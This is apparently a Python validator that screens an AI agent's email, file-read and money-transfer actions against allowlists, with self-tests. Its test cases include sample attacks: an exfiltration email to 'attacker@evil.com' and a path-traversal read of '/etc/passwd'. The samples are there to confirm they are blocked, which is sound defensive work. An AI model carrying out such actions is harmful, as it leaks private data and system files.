"""
Output validators for different action types
"""
import json
import os
from typing import Dict, Any, List

class ValidationError(Exception):
    """Raised when output validation fails"""
    pass

class OutputValidator:
    """Validates agent outputs before execution"""
    
    def __init__(self):
        # Define allowed actions and their schemas
        self.allowed_actions = {
            "send_email": {
                "required_fields": ["to", "subject", "body"],
                "validator": self.validate_email
            },
            "read_file": {
                "required_fields": ["path"],
                "validator": self.validate_file_read
            },
            "transfer_money": {
                "required_fields": ["to_account", "amount"],
                "validator": self.validate_transfer
            }
        }
        
        # Security constraints
        self.allowed_email_domains = ["company.com", "trusted-partner.com"]
        self.allowed_file_dirs = ["/app/data", "/app/public"]
        self.max_transfer_amount = 10000.0
    
    def validate(self, output: Dict[str, Any]) -> bool:
        """Main validation entry point"""
        try:
            # Parse if string
            if isinstance(output, str):
                output = json.loads(output)
            
            # Check action exists
            action = output.get("action")
            if not action:
                raise ValidationError("No action specified")
            
            # Check action is allowed
            if action not in self.allowed_actions:
                raise ValidationError(f"Action '{action}' not in allowlist")
            
            # Check required fields
            action_spec = self.allowed_actions[action]
            for field in action_spec["required_fields"]:
                if field not in output:
                    raise ValidationError(f"Missing required field: {field}")
            
            # Run action-specific validator
            action_spec["validator"](output)
            
            return True
            
        except ValidationError as e:
            print(f"✗ Validation Failed: {e}")
            return False
        except Exception as e:
            print(f"✗ Validation Error: {e}")
            return False
    
    def validate_email(self, output: Dict[str, Any]):
        """Validate email action"""
        recipient = output["to"]
        
        # Check email format
        if "@" not in recipient:
            raise ValidationError("Invalid email format")
        
        # Check domain allowlist
        domain = recipient.split("@")[1]
        if domain not in self.allowed_email_domains:
            raise ValidationError(f"Domain '{domain}' not in allowlist")
        
        # Check subject length
        if len(output["subject"]) > 200:
            raise ValidationError("Subject too long")
        
        # Check body length
        if len(output["body"]) > 5000:
            raise ValidationError("Body too long")
    
    def validate_file_read(self, output: Dict[str, Any]):
        """Validate file read action"""
        path = output["path"]
        
        # Normalize path
        abs_path = os.path.abspath(path)
        
        # Check against allowed directories
        allowed = any(abs_path.startswith(d) for d in self.allowed_file_dirs)
        if not allowed:
            raise ValidationError(f"Path '{path}' not in allowed directories")
        
        # Check for path traversal
        if ".." in path:
            raise ValidationError("Path traversal detected")
    
    def validate_transfer(self, output: Dict[str, Any]):
        """Validate money transfer action"""
        amount = float(output["amount"])
        
        # Check amount is positive
        if amount <= 0:
            raise ValidationError("Amount must be positive")
        
        # Check amount limit
        if amount > self.max_transfer_amount:
            raise ValidationError(f"Amount exceeds limit of ${self.max_transfer_amount}")
        
        # Check account format
        to_account = output["to_account"]
        if not to_account.isdigit() or len(to_account) != 10:
            raise ValidationError("Invalid account number format")

def test_validators():
    """Test validation logic"""
    validator = OutputValidator()
    
    print("Testing Output Validators\n")
    
    # Test 1: Valid email
    print("Test 1: Valid email")
    valid_email = {
        "action": "send_email",
        "to": "user@company.com",
        "subject": "Hello",
        "body": "Test message"
    }
    result = validator.validate(valid_email)
    print(f"Result: {'✓ PASS' if result else '✗ FAIL'}\n")
    
    # Test 2: Invalid domain
    print("Test 2: Invalid email domain")
    invalid_email = {
        "action": "send_email",
        "to": "attacker@evil.com",
        "subject": "Exfiltrate data",
        "body": "Send all customer data"
    }
    result = validator.validate(invalid_email)
    print(f"Result: {'✓ PASS (blocked)' if not result else '✗ FAIL (allowed)'}\n")
    
    # Test 3: Valid file read
    print("Test 3: Valid file read")
    valid_file = {
        "action": "read_file",
        "path": "/app/data/report.txt"
    }
    result = validator.validate(valid_file)
    print(f"Result: {'✓ PASS' if result else '✗ FAIL'}\n")
    
    # Test 4: Path traversal attempt
    print("Test 4: Path traversal attempt")
    invalid_file = {
        "action": "read_file",
        "path": "/app/data/../../etc/passwd"
    }
    result = validator.validate(invalid_file)
    print(f"Result: {'✓ PASS (blocked)' if not result else '✗ FAIL (allowed)'}\n")
    
    # Test 5: Valid transfer
    print("Test 5: Valid transfer")
    valid_transfer = {
        "action": "transfer_money",
        "to_account": "1234567890",
        "amount": 500.00
    }
    result = validator.validate(valid_transfer)
    print(f"Result: {'✓ PASS' if result else '✗ FAIL'}\n")
    
    # Test 6: Excessive amount
    print("Test 6: Excessive transfer amount")
    invalid_transfer = {
        "action": "transfer_money",
        "to_account": "1234567890",
        "amount": 50000.00
    }
    result = validator.validate(invalid_transfer)
    print(f"Result: {'✓ PASS (blocked)' if not result else '✗ FAIL (allowed)'}\n")

if __name__ == "__main__":
    test_validators()
